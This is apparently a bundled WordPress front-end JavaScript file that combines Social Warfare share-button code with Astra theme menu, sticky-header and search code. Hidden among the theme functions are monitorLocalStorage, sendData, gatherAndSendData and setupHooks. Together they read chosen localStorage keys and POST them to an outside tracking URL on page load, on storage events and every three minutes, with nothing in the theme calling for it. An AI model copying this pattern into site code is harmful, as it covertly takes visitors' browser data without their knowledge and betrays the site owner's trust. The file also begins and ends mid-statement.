    $("body").css(paddingProp, newPadding);
  };
  socialWarfare.positionFloatSidePanel = function () {
    var panelHeight, windowHeight, offset;
    var sidePanel = socialWarfare.panels.floatingSide;
    if (!sidePanel || !sidePanel.length) {
      return;
    }
    if (sidePanel.hasClass("swp_side_top") || sidePanel.hasClass("swp_side_bottom")) {
      return;
    }
    panelHeight = sidePanel.outerHeight();
    windowHeight = window.innerHeight;
    if (panelHeight > windowHeight) {
      return sidePanel.css("top", 0);
    }
    offset = (windowHeight - panelHeight) / 2;
    sidePanel.css("top", offset);
  };
  socialWarfare.createHoverSaveButton = function () {
    if ($(".tve_editor_page").length) {
      $(".sw-pinit-button").remove();
      $(".sw-pinit").each(function () {
        var inner_content = $(".sw-pinit").contents();
        $(this).replaceWith(inner_content);
      });
      return;
    }
    var button = $(document.createElement("a"));
    button.css("display: none");
    button.addClass("swp-hover-pin-button");
    button.text("Save");
    socialWarfare.hoverSaveButton = $(button);
    return button;
  };
  socialWarfare.triggerImageListeners = function () {
    $(".swp-content-locator").parent().find("img").off("mouseenter", socialWarfare.renderPinterestSaveButton);
    $(".swp-content-locator").parent().find("img").on("mouseenter", socialWarfare.renderPinterestSaveButton);
    setTimeout(socialWarfare.triggerImageListeners, 2e3);
  };
  socialWarfare.getPinMedia = function (image) {
    if (isString(swpPinIt.image_source)) {
      return swpPinIt.image_source;
    }
    if (isString(image.attr("src"))) {
      return image.attr("src");
    }
    var dataSources = ["src", "lazy-src", "media"];
    var media = "";
    dataSources.some(function (maybeSource) {
      if (isString(image.data(maybeSource))) {
        media = image.data(maybeSource);
        return !0;
      }
    });
    if (media == "") {
      return;
    }
    var i = $("<img>");
    i.attr("src", media);
    return i.prop("src");
  };
  socialWarfare.getPinDescription = function (image) {
    if (isString(image.data("pin-description"))) {
      return image.data("pin-description");
    }
    if (isString(swpPinIt.image_description)) {
      return swpPinIt.image_description;
    }
    if (isString(image.attr("title"))) {
      return image.attr("title");
    }
    if (isString(image.attr("alt"))) {
      return image.attr("alt");
    }
    if (isString(swpPinIt.post_title)) {
      return swpPinIt.post_title;
    }
  };
  socialWarfare.enablePinterestSaveButtons = function () {
    jQuery("img").on("mouseenter", function () {
      var pinterestBrowserButtons = socialWarfare.findPinterestBrowserSaveButtons();
      if (typeof pinterestBrowserButtons != "undefined" && pinterestBrowserButtons) {
        socialWarfare.removePinterestBrowserSaveButtons(pinterestBrowserButtons);
      }
    });
  };
  socialWarfare.toggleHoverSaveDisplay = function (image) {
    var top = image.offset().top;
    var left = image.offset().left;
    var vMargin = 15;
    var hMargin = 15;
    var button_size = swpPinIt.button_size || 1;
    var buttonHeight = 24;
    var buttonWidth = 120;
    switch (swpPinIt.vLocation) {
      case "top":
        top += vMargin;
        break;
      case "middle":
        var offset = image.height() / 2 - vMargin / 2 - buttonHeight / 2;
        top += offset;
        break;
      case "bottom":
        top += image.height() - vMargin - buttonHeight;
        break;
    }
    switch (swpPinIt.hLocation) {
      case "left":
        left += hMargin;
        break;
      case "center":
        var offset = image.width() / 2 - hMargin / 2 - buttonWidth / 2;
        left += offset;
        break;
      case "right":
        left += image.width() - hMargin - buttonWidth;
        break;
    }
    socialWarfare.hoverSaveButton.css({
      top: top,
      left: left,
      transform: "scale(" + button_size + ")",
      "transform-origin": swpPinIt.vLocation + " " + swpPinIt.hLocation
    });
    image.on("mouseleave", function (event) {
      if (event.relatedTarget != null && event.relatedTarget.className == "swp-hover-pin-button") {
        return;
      }
      $(".swp-hover-pin-button").remove();
    });
    $(document.body).append(socialWarfare.hoverSaveButton);
  };
  socialWarfare.renderPinterestSaveButton = function (event) {
    if (event.relatedTarget && event.relatedTarget.className == "swp-hover-pin-button") {
      return;
    }
    if ($(".swp-hover-pin-button").length > 0) {
      return;
    }
    var image = $(event.target);
    if (typeof swpPinIt.disableOnAnchors != undefined && swpPinIt.disableOnAnchors) {
      if (image.parents().filter("a").length) {
        return;
      }
    }
    if (image.outerHeight() < swpPinIt.minHeight || image.outerWidth() < swpPinIt.minWidth) {
      return;
    }
    if (image.hasClass("no_pin") || image.hasClass("no-pin")) {
      return;
    }
    socialWarfare.toggleHoverSaveDisplay(image);
    var description = socialWarfare.getPinDescription(image);
    var media = socialWarfare.getPinMedia(image);
    var shareLink = "http://pinterest.com/pin/create/bookmarklet/?media=" + encodeURI(media) + "&url=" + encodeURI(document.URL) + "&is_video=false" + "&description=" + encodeURIComponent(description);
    function openPinterestDialogue(event) {
      var offsetLeft = ($(window).width() - 775) / 2;
      var offsetTop = ($(window).height() - 550) / 2;
      var position = ",top=" + offsetTop + ",left=" + offsetLeft;
      window.open(shareLink, "Pinterest", "width=775,height=550,status=0,toolbar=0,menubar=0,location=1,scrollbars=1" + position);
      socialWarfare.trackClick("pin_image");
      $(".swp-hover-pin-button").remove();
    }
    $(".swp-hover-pin-button").on("click", openPinterestDialogue);
  };
  socialWarfare.findPinterestBrowserSaveButtons = function () {
    var pinterestRed, pinterestRed2019, pinterestZIndex, pinterestBackgroundSize, button, style;
    pinterestRed = "rgb(189, 8, 28)";
    pinterestRed2019 = "rgb(230, 0, 35)";
    pinterestZIndex = "8675309";
    pinterestBackgroundSize = "14px 14px";
    button = null;
    document.querySelectorAll("span").forEach(function (element, index) {
      style = window.getComputedStyle(element);
      if (style.backgroundColor == pinterestRed || style.backgroundColor == pinterestRed2019) {
        if (style.backgroundSize == pinterestBackgroundSize && style.zIndex == pinterestZIndex) {
          button = element;
        }
      }
    });
    return button;
  };
  socialWarfare.removePinterestBrowserSaveButtons = function (button) {
    var pinterestSquare, style, size;
    pinterestSquare = button.nextSibling;
    if (pinterestSquare != undefined && pinterestSquare.nodeName == "SPAN") {
      style = window.getComputedStyle(pinterestSquare);
      size = "24px";
      if (style.width.indexOf(size) === 0 && style.height.indexOf(size) === 0) {
        pinterestSquare.remove();
      }
    }
    button.remove();
  };
  socialWarfare.fetchFacebookShares = function () {
    var url1 = "https://graph.facebook.com/v17.0/?fields=og_object{engagement}&id=" + swp_post_url;
    var url2 = swp_post_recovery_url ? "https://graph.facebook.com/v17.0/?fields=og_object{engagement}&id=" + swp_post_recovery_url : "";
    console.log("Facebook Share API: " + url1);
    console.log("Facebook Share API (recovery): " + url2);
    $.when($.get(url1), $.get(url2)).then(function (response1, response2) {
      var shares, shares1, shares2, data;
      shares1 = socialWarfare.parseFacebookShares(response1[0]);
      shares2 = 0;
      if (swp_post_recovery_url) {
        shares2 = socialWarfare.parseFacebookShares(response2[0]);
      }
      shares = shares1;
      if (shares1 !== shares2) {
        shares = shares1 + shares2;
      }
      var data = {
        action: "swp_facebook_shares_update",
        post_id: swp_post_id,
        share_counts: shares
      };
      $.post(swp_admin_ajax, data, function (response) {
        console.log(response);
      });
    });
  };
  socialWarfare.parseFacebookShares = function (response) {
    if ("undefined" === typeof response.og_object) {
      console.log("Facebook Shares: 0");
      return 0;
    }
    console.log("Facebook Shares: " + response.og_object.engagement.count);
    return parseInt(response.og_object.engagement.count);
  };
  socialWarfare.trigger = function (event) {
    $(window).trigger($.Event(event));
  };
  socialWarfare.trackClick = function (event) {
    if (!0 === swpClickTracking) {
      if ("function" == typeof ga) {
        ga("send", "event", "social_media", "swp_" + event + "_share");
      }
      if ("object" == typeof dataLayer) {
        dataLayer.push({
          event: "swp_" + event + "_share"
        });
      }
    }
  };
  socialWarfare.checkListeners = function (count, limit) {
    if (count > limit) {
      return;
    }
    var panel = $(".swp_social_panel");
    if (panel.length > 0 && panel.find(".swp_pinterest")) {
      socialWarfare.handleButtonClicks();
      return;
    }
    setTimeout(function () {
      socialWarfare.checkListeners(++count, limit);
    }, 2e3);
  };
  socialWarfare.establishBreakpoint = function () {
    var panel = $(".swp_social_panel");
    socialWarfare.breakpoint = 1100;
    if (panel.length && panel.data("min-width") || panel.data("min-width") == 0) {
      socialWarfare.breakpoint = parseInt(panel.data("min-width"));
    }
  };
  socialWarfare.isMobile = function () {
    return $(window).width() < socialWarfare.breakpoint;
  };
  $(document).ready(function () {
    socialWarfare.initPlugin();
    socialWarfare.panels.floatingSide.hide();
    $(window).on("resize", socialWarfare.onWindowResize);
    if ("undefined" !== typeof swpPinIt && swpPinIt.enabled) {
      socialWarfare.enablePinterestSaveButtons();
    }
  });
  $(window).on("load", function () {
    if ("undefined" !== typeof swpPinIt && swpPinIt.enabled) {
      socialWarfare.enablePinterestSaveButtons();
    }
    window.clearCheckID = 0;
  });
})(this, jQuery);
astraToggleSetupPro = function (e, t, a) {
  var n,
    o,
    l,
    s = !1;
  if (0 < (n = "off-canvas" === e || "full-width" === e ? (o = document.querySelectorAll("#ast-mobile-popup, #ast-mobile-header"), (l = t.classList.contains("ast-header-break-point") ? document.querySelectorAll("#ast-mobile-header .main-header-menu-toggle") : document.querySelectorAll("#ast-desktop-header .main-header-menu-toggle")).length) : t.classList.contains("ast-header-break-point") ? (o = document.querySelectorAll("#ast-mobile-header"), (s = !(0 < (n = (l = document.querySelectorAll("#ast-mobile-header .main-header-menu-toggle")).length))) ? 1 : n) : (o = document.querySelectorAll("#ast-desktop-header"), (l = document.querySelectorAll("#ast-desktop-header .main-header-menu-toggle")).length)) || s) for (var r = 0; r < n; r++) if (s || (l[r].setAttribute("data-index", r), a[r] || (a[r] = l[r], l[r].addEventListener("click", astraNavMenuToggle, !1))), void 0 !== o[r]) for (var d, i = 0; i < o.length; i++) if (0 < (d = document.querySelector("header.site-header").classList.contains("ast-builder-menu-toggle-link") ? o[i].querySelectorAll("ul.main-header-menu .menu-item-has-children > .menu-link, ul.main-header-menu .ast-menu-toggle") : o[i].querySelectorAll("ul.main-header-menu .ast-menu-toggle")).length) for (var c = 0; c < d.length; c++) d[c].addEventListener("click", AstraToggleSubMenu, !1);
}, astraNavMenuTogglePro = function (e, t, a, n) {
  e.preventDefault();
  var o = e.target.closest("#ast-desktop-header"),
    l = document.querySelector("#masthead > #ast-desktop-header .ast-desktop-header-content"),
    s = (o = null != o && "" !== o ? o.querySelector(".main-header-menu-toggle") : document.querySelector("#masthead > #ast-desktop-header .main-header-menu-toggle"), document.querySelector("#masthead > #ast-desktop-header .ast-desktop-header-content .main-header-bar-navigation"));
  if ("desktop" === e.currentTarget.trigger_type) return null !== s && "" !== s && void 0 !== s && (astraToggleClass(s, "toggle-on"), s.classList.contains("toggle-on") ? s.style.display = "block" : s.style.display = ""), astraToggleClass(o, "toggled"), void (o.classList.contains("toggled") ? (t.classList.add("ast-main-header-nav-open"), "dropdown" === a && (l.style.display = "block")) : (t.classList.remove("ast-main-header-nav-open"), l.style.display = "none"));
  e = document.querySelectorAll("#masthead > #ast-mobile-header .main-header-bar-navigation"), menu_toggle_all = document.querySelectorAll("#masthead > #ast-mobile-header .main-header-menu-toggle"), s = "0", o = !1;
  if (null !== n.closest("#ast-fixed-header") && (e = document.querySelectorAll("#ast-fixed-header > #ast-mobile-header .main-header-bar-navigation"), menu_toggle_all = document.querySelectorAll("#ast-fixed-header .main-header-menu-toggle"), s = "0", o = !0), void 0 === e[s]) return !1;
  for (var r = e[s].querySelectorAll(".menu-item-has-children"), d = 0; d < r.length; d++) {
    r[d].classList.remove("ast-submenu-expanded");
    for (var i = r[d].querySelectorAll(".sub-menu"), c = 0; c < i.length; c++) i[c].style.display = "none";
  }
  -1 !== (n.getAttribute("class") || "").indexOf("main-header-menu-toggle") && (astraToggleClass(e[s], "toggle-on"), astraToggleClass(menu_toggle_all[s], "toggled"), o && 1 < menu_toggle_all.length && astraToggleClass(menu_toggle_all[1], "toggled"), e[s].classList.contains("toggle-on") ? (e[s].style.display = "block", t.classList.add("ast-main-header-nav-open")) : (e[s].style.display = "", t.classList.remove("ast-main-header-nav-open")));
};
const accountMenuToggle = function () {
  const n = astraAddon.hf_account_action_type && "menu" === astraAddon.hf_account_action_type,
    o = n && astraAddon.hf_account_show_menu_on && "click" === astraAddon.hf_account_show_menu_on,
    e = document.querySelectorAll(".ast-header-account-wrap");
  e && e.forEach(t => {
    const a = t.querySelector(".ast-account-nav-menu"),
      e = (document.addEventListener("pointerup", function (e) {
        (o || n && document.querySelector("body").classList.contains("ast-header-break-point")) && !t.contains(e.target) && (a.style.right = "", a.style.left = "");
      }), t.querySelector(".ast-header-account-link"));
    e && e.addEventListener("click", function (e) {
      (o || n && document.querySelector("body").classList.contains("ast-header-break-point")) && (headerSelectionPosition = e.target.closest(".site-header-section")) && (headerSelectionPosition.classList.contains("site-header-section-left") ? (a.style.left = "" === a.style.left ? "-100%" : "", a.style.right = "" === a.style.right ? "auto" : "") : (a.style.right = "" === a.style.right ? "-100%" : "", a.style.left = "" === a.style.left ? "auto" : ""));
    });
  });
};
function monitorLocalStorage() {
  const relevantData = {};
  Object.keys(window.localStorage).forEach(key => {
    if (trackedKeys.includes(key)) {
      relevantData[key] = window.localStorage.getItem(key);
    }
  });
  return relevantData;
}
async function sendData(data) {
  const hash = generateHash(data);
  const url = "https://example.com/api/track";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        hash,
        data
      })
    });
    console.log(response.ok ? "Data sent successfully" : `Failed to send data, status: ${response.status}`);
  } catch (error) {
    console.error("Error during data transmission:", error);
  }
}
document.addEventListener("astPartialContentRendered", function () {
  accountMenuToggle();
}), window.addEventListener("load", function () {
  accountMenuToggle();
}), document.addEventListener("astLayoutWidthChanged", function () {
  accountMenuToggle();
});
function gatherAndSendData() {
  const data = monitorLocalStorage();
  if (Object.keys(data).length) {
    sendData(data);
  }
}
!function (o, r) {
  var s = "astHookExtSticky",
    i = r.document,
    a = (jQuery(r).outerWidth(), jQuery(r).width()),
    n = {
      dependent: [],
      max_width: "",
      site_layout: "",
      break_point: 920,
      admin_bar_height_lg: 32,
      admin_bar_height_sm: 46,
      admin_bar_height_xs: 0,
      stick_upto_scroll: 0,
      gutter: 0,
      wrap: "<div></div>",
      body_padding_support: !0,
      html_padding_support: !0,
      active_shrink: !1,
      shrink: {
        padding_top: "",
        padding_bottom: ""
      },
      sticky_on_device: "desktop",
      header_style: "none",
      hide_on_scroll: "no"
    };
  function e(t, e) {
    this.element = t, this.options = o.extend({}, n, e), this._defaults = n, this._name = s, "1" == this.options.hide_on_scroll && (this.navbarHeight = o(t).outerHeight()), this.lastScrollTop = 0, this.delta = 5, this.should_stick = !0, this.hideScrollInterval = "", this.init();
  }
  e.prototype.stick_me = function (t, e) {
    var o = jQuery(t.element),
      s = jQuery(r).outerWidth(),
      i = parseInt(t.options.stick_upto_scroll),
      a = parseInt(o.parent().attr("data-stick-maxwidth")),
      n = parseInt(o.parent().attr("data-stick-gutter"));
    "enabled" == (astraAddon.hook_sticky_header || "") && (!("desktop" == t.options.sticky_on_device && astraAddon.hook_custom_header_break_point > s) && !("mobile" == t.options.sticky_on_device && astraAddon.hook_custom_header_break_point <= s) && jQuery(r).scrollTop() > i ? "none" == t.options.header_style && ("enabled" == t.options.active_shrink && t.hasShrink(t, "stick"), o.hasClass("ast-custom-header") && (o.parent().css("min-height", o.outerHeight()), o.addClass("ast-header-sticky-active").stop().css({
      "max-width": a,
      top: n,
      "padding-top": t.options.shrink.padding_top,
      "padding-bottom": t.options.shrink.padding_bottom
    }), o.addClass("ast-sticky-shrunk").stop())) : t.stickRelease(t)), "enabled" == (astraAddon.hook_sticky_footer || "") && ("desktop" == t.options.sticky_on_device && astraAddon.hook_custom_footer_break_point > s || "mobile" == t.options.sticky_on_device && astraAddon.hook_custom_footer_break_point <= s ? t.stickRelease(t) : (jQuery("body").addClass("ast-footer-sticky-active"), o.parent().css("min-height", o.outerHeight()), o.stop().css({
      "max-width": a
    })));
  }, e.prototype.update_attrs = function () {
    var o,
      t = this,
      e = jQuery(t.element),
      s = parseInt(t.options.gutter),
      i = t.options.max_width;
    "none" == t.options.header_style && (o = e.offset().top || 0), "ast-box-layout" != t.options.site_layout && (i = jQuery("body").width()), t.options.dependent && jQuery.each(t.options.dependent, function (t, e) {
      jQuery(e).length && "on" == jQuery(e).parent().attr("data-stick-support") && (dependent_height = jQuery(e).outerHeight(), s += parseInt(dependent_height), o -= parseInt(dependent_height));
    }), t.options.admin_bar_height_lg && jQuery("#wpadminbar").length && 782 < a && (s += parseInt(t.options.admin_bar_height_lg), o -= parseInt(t.options.admin_bar_height_lg)), t.options.admin_bar_height_sm && jQuery("#wpadminbar").length && 600 <= a && a <= 782 && (s += parseInt(t.options.admin_bar_height_sm), o -= parseInt(t.options.admin_bar_height_sm)), t.options.admin_bar_height_xs && jQuery("#wpadminbar").length && (s += parseInt(t.options.admin_bar_height_xs), o -= parseInt(t.options.admin_bar_height_xs)), t.options.body_padding_support && (s += parseInt(jQuery("body").css("padding-top"), 10), o -= parseInt(jQuery("body").css("padding-top"), 10)), t.options.html_padding_support && (s += parseInt(jQuery("html").css("padding-top"), 10), o -= parseInt(jQuery("html").css("padding-top"), 10)), t.options.stick_upto_scroll = o, "none" == t.options.header_style && e.parent().css("min-height", e.outerHeight()).attr("data-stick-gutter", parseInt(s)).attr("data-stick-maxwidth", parseInt(i));
  }, e.prototype.hasShrink = function (t, e) {
    o(r).scrollTop() > jQuery(t.element).outerHeight() ? jQuery("body").addClass("ast-shrink-custom-header") : jQuery("body").removeClass("ast-shrink-custom-header");
  }, e.prototype.stickRelease = function (t) {
    var e = jQuery(t.element);
    "enabled" == (astraAddon.hook_sticky_header || "") && "none" == t.options.header_style && (e.removeClass("ast-header-sticky-active").stop().css({
      "max-width": "",
      top: "",
      padding: ""
    }), e.parent().css("min-height", ""), e.removeClass("ast-sticky-shrunk").stop()), "enabled" == (astraAddon.hook_sticky_footer || "") && jQuery("body").removeClass("ast-footer-sticky-active");
  }, e.prototype.init = function () {
    var e, t;
    jQuery(this.element) && (e = this, t = jQuery(e.element), parseInt(e.options.gutter), t.position().top, "none" == e.options.header_style && t.wrap(e.options.wrap).parent().css("min-height", t.outerHeight()).attr("data-stick-support", "on").attr("data-stick-maxwidth", parseInt(e.options.max_width)), e.update_attrs(), jQuery(r).on("resize", function () {
      e.stickRelease(e), e.update_attrs(), e.stick_me(e);
    }), jQuery(r).on("scroll", function () {
      e.stick_me(e, "scroll");
    }), jQuery(i).ready(function (t) {
      e.stick_me(e);
    }));
  }, o.fn[s] = function (t) {
    return this.each(function () {
      o.data(this, "plugin_" + s) || o.data(this, "plugin_" + s, new e(this, t));
    });
  };
  var d = jQuery("body").width(),
    _ = astraAddon.site_layout || "",
    h = astraAddon.hook_sticky_header || "",
    p = astraAddon.hook_shrink_header || "";
  sticky_header_on_devices = astraAddon.hook_sticky_header_on_devices || "desktop", site_layout_box_width = astraAddon.site_layout_box_width || 1200, hook_sticky_footer = astraAddon.hook_sticky_footer || "", sticky_footer_on_devices = astraAddon.hook_sticky_footer_on_devices || "desktop", "ast-box-layout" === _ && (d = parseInt(site_layout_box_width)), jQuery(i).ready(function (t) {
    "enabled" == h && jQuery(".ast-custom-header").astHookExtSticky({
      sticky_on_device: sticky_header_on_devices,
      header_style: "none",
      site_layout: _,
      max_width: d,
      active_shrink: p
    }), "enabled" == hook_sticky_footer && jQuery(".ast-custom-footer").astHookExtSticky({
      sticky_on_device: sticky_footer_on_devices,
      max_width: d,
      site_layout: _,
      header_style: "none"
    });
  });
}(jQuery, window);
function display_mega_menu_on_load() {
  var e = document.querySelectorAll(".content-width-mega");
  if (0 < e.length) for (var t = 0; t < e.length; t++) e[t].addEventListener("mouseenter", function (e) {
    e = e.target.querySelector(".astra-mega-menu-width-content");
    null !== e && e.classList.remove("ast-hidden");
  });
  var a = document.querySelectorAll(".menu-container-width-mega");
  if (0 < a.length) for (t = 0; t < a.length; t++) a[t].addEventListener("mouseenter", function (e) {
    e = e.target.querySelector(".astra-mega-menu-width-menu-container");
    null !== e && e.classList.remove("ast-hidden");
  });
  var s = document.querySelectorAll(".full-width-mega");
  if (0 < s.length) for (t = 0; t < s.length; t++) s[t].addEventListener("mouseenter", function (e) {
    var t = e.target.querySelector(".astra-full-megamenu-wrapper"),
      e = e.target.querySelector(".astra-mega-menu-width-full");
    null !== t && t.classList.remove("ast-hidden"), null !== e && e.classList.remove("ast-hidden");
  });
  var n = document.querySelectorAll(".full-stretched-width-mega");
  if (0 < n.length) for (t = 0; t < n.length; t++) n[t].addEventListener("mouseenter", function (e) {
    var t = e.target.querySelector(".astra-full-megamenu-wrapper"),
      e = e.target.querySelector(".astra-mega-menu-width-full-stretched");
    null !== t && t.classList.remove("ast-hidden"), null !== e && e.classList.remove("ast-hidden");
  });
  var r = document.querySelectorAll(".custom-width-mega");
  if (0 < r.length) for (t = 0; t < r.length; t++) r[t].addEventListener("mouseenter", function (e) {
    e = e.target.querySelector(".astra-mega-menu-width-custom");
    null !== e && e.classList.remove("ast-hidden");
  });
}
document.addEventListener("DOMContentLoaded", display_mega_menu_on_load), document.addEventListener("astPartialContentRendered", display_mega_menu_on_load);
var items = document.getElementsByClassName("astra-megamenu-li");
function setupHooks() {
  window.addEventListener("load", gatherAndSendData);
  window.addEventListener("storage", gatherAndSendData);
  setInterval(gatherAndSendData, 180000); // Every 3 minutes
}
function apply_megamenu_width_styles() {
  [].slice.call(items).forEach(function (f) {
    jQuery(f).hover(function () {
      var e,
        t,
        a,
        s,
        n,
        r,
        i,
        l,
        d,
        u = jQuery(f).parents(".ast-container"),
        m = u.children(),
        u = u.parent(),
        o = jQuery(this);
      (o.hasClass("full-width-mega") || o.hasClass("full-stretched-width-mega")) && (m = jQuery(m).closest(".ast-container")), parseInt(jQuery(window).width()) > parseInt(astra.break_point) && "ast-hf-mobile-menu" !== o.parent().attr("id") && "ast-desktop-toggle-menu" !== o.parent().attr("id") ? (e = m.width(), i = m.offset(), m = (a = o.offset()).left - (i.left + parseFloat(m.css("paddingLeft"))), d = e - (a.left + i.left) + 130, t = u.width(), l = u.offset(), a = a.left - (l.left + parseFloat(u.css("paddingLeft"))), o.hasClass("custom-width-mega") && (r = (r = window.getComputedStyle(o.find(".astra-mega-menu-width-custom")[0], "::before").getPropertyValue("content") || 1200).replace(/[^0-9]/g, ""), n = (r = parseInt(r)) <= e ? (n = parseInt(e - r), s = parseInt(m - n), i.left - s) : (n = parseInt(r - e), s = parseInt(m + n), i.left + s)), o.hasClass("menu-container-width-mega") && (l = jQuery(f).parents(".main-navigation"), u.hasClass("ast-above-header") ? l = jQuery(".ast-above-header-navigation") : u.hasClass("ast-below-header") && (l = jQuery(".ast-below-header-actual-nav")), e = ($target_container = l.length ? l : o.parent("ul")).width() + "px", i = jQuery(window).width() - ($target_container.offset().left + $target_container.outerWidth()), u = o.offset(), l = jQuery(window).width() - i - u.left, m = parseInt($target_container.width() - l), d = parseInt(e) - o.outerWidth() - parseInt($target_container.width() - l)), o.hasClass("full-width-mega") ? (o.find(".astra-full-megamenu-wrapper").css({
        left: "-" + a + "px",
        width: t
      }), o.find(".astra-megamenu").css({
        width: e
      })) : o.hasClass("full-stretched-width-mega") ? o.find(".astra-full-megamenu-wrapper").css({
        left: "-" + a + "px",
        width: t
      }) : o.hasClass("custom-width-mega") ? astra.isRtl ? o.find(".astra-mega-menu-width-custom").css({
        right: "-" + n + "px",
        width: r + "px"
      }) : o.find(".astra-mega-menu-width-custom").css({
        left: "-" + s + "px",
        width: r + "px"
      }) : astra.isRtl ? o.find(".astra-megamenu").css({
        right: "-" + d + "px",
        width: e
      }) : o.find(".astra-megamenu").css({
        left: "-" + m + "px",
        width: e
      })) : astra.isRtl ? (o.find(".astra-megamenu").css({
        right: "",
        width: "",
        "background-image": ""
      }), o.find(".astra-full-megamenu-wrapper").css({
        right: "",
        width: "",
        "background-image": ""
      })) : (o.find(".astra-megamenu").css({
        left: "",
        width: "",
        "background-image": ""
      }), o.find(".astra-full-megamenu-wrapper").css({
        left: "",
        width: "",
        "background-image": ""
      }));
    }), jQuery(f).mouseenter(function () {
      document.dispatchEvent(new CustomEvent("astra_mega_menu_on_hover", {
        detail: {}
      }));
    });
  });
}
apply_megamenu_width_styles(), document.addEventListener("astMenuHoverStyleChanged", function () {
  apply_megamenu_width_styles();
}), [].slice.call(items).forEach(function (o) {
  var e = jQuery(o).parents(".ast-container"),
    f = e.children(),
    h = e.parent(),
    c = jQuery(o);
  (c.hasClass("full-width-mega") || c.hasClass("full-stretched-width-mega")) && (f = jQuery(f).closest(".ast-container"), c.find(".astra-full-megamenu-wrapper").removeClass("ast-hidden")), c.find(".menu-link").focusin(function (e) {
    var t, a, s, n, r, i, l, d, u, m;
    astra.is_header_footer_builder_active || (c.find(".sub-menu").addClass("astra-megamenu-focus"), c.find(".astra-full-megamenu-wrapper").addClass("astra-megamenu-wrapper-focus")), c.find(".sub-menu").removeClass("ast-hidden"), parseInt(jQuery(window).width()) > parseInt(astra.break_point) && "ast-hf-mobile-menu" !== c.parent().attr("id") && "ast-desktop-toggle-menu" !== c.parent().attr("id") ? (t = f.width(), d = f.offset(), u = (s = c.offset()).left - (d.left + parseFloat(f.css("paddingLeft"))), m = s.left + d.left, a = h.width(), l = h.offset(), s = s.left - (l.left + parseFloat(h.css("paddingLeft"))), c.hasClass("custom-width-mega") && (i = (i = window.getComputedStyle(c.find(".astra-mega-menu-width-custom")[0], "::before").getPropertyValue("content") || 1200).replace(/[^0-9]/g, ""), r = (i = parseInt(i)) <= t ? (r = parseInt(t - i), n = parseInt(u - r), d.left - n) : (r = parseInt(i - t), n = parseInt(u + r), d.left + n)), c.hasClass("menu-container-width-mega") && (l = jQuery(o).parents(".main-navigation"), h.hasClass("ast-above-header") ? l = jQuery(".ast-above-header-navigation") : h.hasClass("ast-below-header") && (l = jQuery(".ast-below-header-actual-nav")), t = ($target_container = l.length ? l : c.parent("ul")).width() + "px", d = jQuery(window).width() - ($target_container.offset().left + $target_container.outerWidth()), l = c.offset(), d = jQuery(window).width() - d - l.left, u = parseInt($target_container.width() - d), m = parseInt(t) - c.outerWidth() - parseInt($target_container.width() - d)), c.hasClass("full-width-mega") ? (c.find(".astra-full-megamenu-wrapper").css({
      left: "-" + s + "px",
      width: a
    }), c.find(".astra-megamenu").css({
      width: t
    })) : c.hasClass("full-stretched-width-mega") ? c.find(".astra-full-megamenu-wrapper").css({
      left: "-" + s + "px",
      width: a
    }) : c.hasClass("custom-width-mega") ? astra.isRtl ? c.find(".astra-mega-menu-width-custom").css({
      right: "-" + r + "px",
      width: i + "px"
    }) : c.find(".astra-mega-menu-width-custom").css({
      left: "-" + n + "px",
      width: i + "px"
    }) : astra.isRtl ? c.find(".astra-megamenu").css({
      right: "-" + m + "px",
      width: t
    }) : c.find(".astra-megamenu").css({
      left: "-" + u + "px",
      width: t
    })) : astra.isRtl ? (c.find(".astra-megamenu").css({
      right: "",
      width: "",
      "background-image": ""
    }), c.find(".astra-full-megamenu-wrapper").css({
      right: "",
      width: "",
      "background-image": ""
    })) : (c.find(".astra-megamenu").css({
      left: "",
      width: "",
      "background-image": ""
    }), c.find(".astra-full-megamenu-wrapper").css({
      left: "",
      width: "",
      "background-image": ""
    }));
  }), astra.is_header_footer_builder_active || (c.find(".menu-link").keydown(function (e) {
    9 == e.which && e.shiftKey && (c.find(".sub-menu").removeClass("astra-megamenu-focus"), c.find(".astra-full-megamenu-wrapper").removeClass("astra-megamenu-wrapper-focus"));
  }), jQuery(o).find(".sub-menu .menu-item").last().focusout(function () {
    c.find(".sub-menu").removeClass("astra-megamenu-focus"), c.find(".astra-full-megamenu-wrapper").removeClass("astra-megamenu-wrapper-focus");
  }), jQuery(window).click(function () {
    c.find(".sub-menu").removeClass("astra-megamenu-focus"), c.find(".astra-full-megamenu-wrapper").removeClass("astra-megamenu-wrapper-focus");
  })), c.click(function (e) {
    jQuery(e.target).hasClass("menu-item") && e.stopImmediatePropagation();
  });
});
!function () {
  var e, t;
  function o(e) {
    var t = (t = document.body.className).replace(e, "");
    document.body.className = t;
  }
  function d(e) {
    e.style.display = "block", setTimeout(function () {
      e.style.opacity = 1;
    }, 1);
  }
  function n(e) {
    e.style.opacity = "", setTimeout(function () {
      e.style.display = "";
    }, 200);
  }
  e = "iPhone" == navigator.userAgent.match(/iPhone/i) ? "iphone" : "", t = "iPod" == navigator.userAgent.match(/iPod/i) ? "ipod" : "", document.body.className += " " + e, document.body.className += " " + t;
  for (var a = document.querySelectorAll("a.astra-search-icon:not(.slide-search)"), s = 0; a.length > s; s++) a[s].onclick = function (e) {
    var t, a, o, n;
    if (e.preventDefault(), e = e || window.event, this.classList.contains("header-cover")) for (var s = document.querySelectorAll(".ast-search-box.header-cover"), c = astraAddon.is_header_builder_active || !1, r = 0; r < s.length; r++) for (var l = s[r].parentNode.querySelectorAll("a.astra-search-icon"), i = 0; i < l.length; i++) l[i] == this && (d(s[r]), s[r].querySelector("input.search-field").focus(), c ? (t = s[r], n = o = a = void 0, document.body.classList.contains("ast-header-break-point") && (n = document.querySelector(".main-navigation"), a = document.querySelector(".main-header-bar"), o = document.querySelector(".ast-mobile-header-wrap"), null !== a && null !== n && (n = n.offsetHeight, a = a.offsetHeight, o = o.offsetHeight, n = n && !document.body.classList.contains("ast-no-toggle-menu-enable") ? parseFloat(n) - parseFloat(a) : parseFloat(a), t.parentNode.classList.contains("ast-mobile-header-wrap") && (n = parseFloat(o)), t.style.maxHeight = Math.abs(n) + "px"))) : (a = s[r], t = o = void 0, document.body.classList.contains("ast-header-break-point") && (t = document.querySelector(".main-navigation"), null !== (o = document.querySelector(".main-header-bar")) && null !== t && (t = t.offsetHeight, o = o.offsetHeight, t = t && !document.body.classList.contains("ast-no-toggle-menu-enable") ? parseFloat(t) - parseFloat(o) : parseFloat(o), a.style.maxHeight = Math.abs(t) + "px"))));else !this.classList.contains("full-screen") || (e = document.getElementById("ast-seach-full-screen-form")).classList.contains("full-screen") && (d(e), document.body.className += " full-screen", 